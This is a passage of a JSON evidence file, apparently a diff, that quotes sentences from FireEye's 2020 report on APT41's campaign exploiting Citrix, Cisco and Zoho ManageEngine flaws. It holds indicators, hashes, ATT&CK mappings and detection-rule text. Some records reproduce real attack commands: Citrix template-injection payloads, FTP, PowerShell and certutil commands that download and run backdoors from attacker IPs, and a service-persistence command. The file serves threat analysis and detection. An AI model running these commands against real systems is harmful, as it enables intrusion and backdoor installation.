+      "text": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_57",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 1,
+        "section": "rule",
+        "sentence_id": "p1_r3"
+      },
+      "text": "The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_58",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r1"
+      },
+      "text": "Figure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_59",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
+      "text": "Figure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_62",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r5"
+      },
+      "text": "NSC_USER: ../../../netscaler/portal/templates/[redacted]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_63",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r6"
+      },
+      "text": "Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test: [redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_67",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r10"
+      },
+      "text": "We did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_73",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r6"
+      },
+      "text": "On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s (CVE-2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r9"
+      },
+      "text": "66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_77",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r10"
+      },
+      "text": "Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_78",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r11"
+      },
+      "text": "On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020- 10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_79",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r1"
+      },
+      "text": "Figure 6: Contents of logger.zip",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_80",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r2"
+      },
+      "text": "Figure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_81",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r3"
+      },
+      "text": "ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_84",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r6"
+      },
+      "text": "Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\ Windows\\Temp\\install.bat')&powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll',' C:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_88",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r10"
+      },
+      "text": "Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_89",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r11"
+      },
+      "text": "In both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_94",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r5"
+      },
+      "text": "sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_98",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r9"
+      },
+      "text": "Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_99",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r1"
+      },
+      "text": "Figure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader via CertUtil",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_100",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r2"
+      },
+      "text": "Figure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloader",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_101",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r3"
+      },
+      "text": "Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_102",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r4"
+      },
+      "text": "GET /2.exe HTTP/1.1 Cache-Control: no-cache Connection: Keep-Alive Pragma: no-cache Accept: */* User-Agent: Microsoft-CryptoAPI/6.3 Host: 91.208.184[.]78",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_103",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r5"
+      },
+      "text": "certutil -urlcache -split -f http://91.208.184[.]78/2.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_104",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r6"
+      },
+      "text": "The Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_106",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r8"
+      },
+      "text": "ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an update on March 7, 2020, with a long term fix.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_112",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r6"
+      },
+      "text": "‘1.txt’ (MD5: c0c467c8e9b2046d7053642cc9bdd57d)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_113",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r7"
+      },
+      "text": "‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_115",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r2"
+      },
+      "text": "storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_117",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r4"
+      },
+      "text": "2.exe (MD5: 3e856162c36b532925c8226b4ed3481c)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_118",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r5"
+      },
+      "text": "TzGG (MD5: 659bd19b562059f3f0cc978e15624fd9)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_119",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r6"
+      },
+      "text": "C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe spawning cmd.exe and/or bitsadmin.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_121",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r8"
+      },
+      "text": "Endpoint Security BITSADMIN.EXE MULTISTAGE DOWNLOADER (METHODOLOGY)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_123",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r1"
+      },
+      "text": "EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_124",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r2"
+      },
+      "text": "EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_125",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r3"
+      },
+      "text": "EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_126",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r4"
+      },
+      "text": "EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_129",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r7"
+      },
+      "text": "External Remote Services (T1133), Exploit Public-Facing Application (T1190)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_130",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r8"
+      },
+      "text": "Execution PowerShell (T1086), Scripting (T1064)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_131",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r9"
+      },
+      "text": "Persistence New Service (T1050)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_132",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r10"
+      },
+      "text": "Exploitation for Privilege Escalation (T1068)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_133",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r11"
+      },
+      "text": "BITS Jobs (T1197), Process Injection (T1055)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_134",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 9,
+        "section": "rule",
+        "sentence_id": "p9_r12"
+      },
+      "text": "Remote File Copy (T1105), Commonly Used Port (T1436), Uncommonly Used Port (T1065), Custom Command and Control Protocol (T1094), Data Encoding (T1132), Standard Application Layer Protocol (T1071)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_137",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 10,
+        "section": "rule",
+        "sentence_id": "p10_r3"
+      },
+      "text": "description \"This looks for a common APT41 Export DLL name in BEACON shellcode loaders, such as loader_X86_svchost.dll\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_146",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 10,
+        "section": "rule",
+        "sentence_id": "p10_r12"
+      },
+      "text": "description = \"This looks for Win PEs where Export DLL name is a something like x32.dat\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_169",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r7"
+      },
+      "text": "sample_md5 = \"09e4e6fa85b802c46bc121fcaecc5666\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_174",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r12"
+      },
+      "text": "sample_md5 = \"71cdba3859ca8bd03c1e996a790c04f9\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_179",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 13,
+        "section": "rule",
+        "sentence_id": "p13_r2"
+      },
+      "text": "sample_md5 = \"013f3bde3f1022b6cf3f2e541d19353c\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_183",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "rule_backfill",
+        "sentence_id": "p5_rb183"
+      },
+      "text": "Host: cdn.bootcss.com",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_184",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "rule_backfill",
+        "sentence_id": "p5_rb184"
+      },
+      "text": "Referer: http://cdn.bootcss.com/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_185",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 5,
+        "section": "rule_backfill",
+        "sentence_id": "p5_rb185"
+      },
+      "text": "ntrol (C2) profile. GET /jquery-3.3.1.min.js HTTP/1.1 Host: cdn.bootcss.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://cdn.bootcss.com/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_186",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb186"
+      },
+      "text": "url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_187",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb187"
+      },
+      "text": "url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test:",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_188",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 3,
+        "section": "rule_backfill",
+        "sentence_id": "p3_rb188"
+      },
+      "text": "url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test:",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_189",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb189"
+      },
+      "text": "r/portal/templates/[redacted] Content-Length: 96 url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %] Figure 2: Example APT41 HTTP tra",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_190",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 11,
+        "section": "rule_backfill",
+        "sentence_id": "p11_rb190"
+      },
+      "text": "https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_191",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 11,
+        "section": "rule_backfill",
+        "sentence_id": "p11_rb191"
+      },
+      "text": "https://github.com/skywind3000/kcp Matches on this rule may have built-in KCP transport ability.\"",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_192",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 11,
+        "section": "rule_backfill",
+        "sentence_id": "p11_rb192"
+      },
+      "text": "from LibTomCrypt as seen by some APT41-esque actors https://github.com/libtom/libtomcrypt - might catch everything BEACON as well. You may want to exclude Golang and UPX packed sam",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_193",
+      "evidence_type": "report_text",
+      "report_id": "Fireeye_APT41-Global-Intrusion-Campaign(03-25-2020)",
+      "locator": {
+        "page": 2,
+        "section": "rule_backfill",
+        "sentence_id": "p2_rb193"
+      },
+      "text": "POST /vpns/portal/scripts/newbm.pl HTTP/1.1",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_194",
+      "evidence_type": "report_text",
